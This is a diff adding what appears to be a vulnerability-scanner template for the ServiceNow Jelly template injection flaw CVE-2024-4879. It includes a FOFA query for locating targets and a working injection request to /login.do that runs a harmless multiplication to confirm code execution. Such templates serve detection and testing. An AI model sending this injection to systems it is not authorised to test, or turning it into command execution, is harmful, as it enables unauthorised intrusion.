@@ -1,0 +1,37 @@
+id: ServiceNow-UI_Jelly-Template-injection-CVE-2024-4879
+
+info:
+  name: "ServiceNow UI Jelly 模板代码注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: icon_hash="1701804003"
+      ServiceNow平台UI模块的Jelly模板引擎存在输入验证缺陷，攻击者可构造包含恶意代码片段的请求参数，绕过安全过滤机制实现服务器端代码执行。该漏洞允许未经身份验证的远程攻击者获取数据库凭证、操作系统权限及敏感配置信息，导致完整的系统控制权丧失。CVE-2024-4879编号已确认该漏洞的远程代码执行风险。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140523973
+  tags: ServiceNow
+
+
+http:
+- raw:
+  - |
+    GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(9527*9527);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '90763729'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
+
+
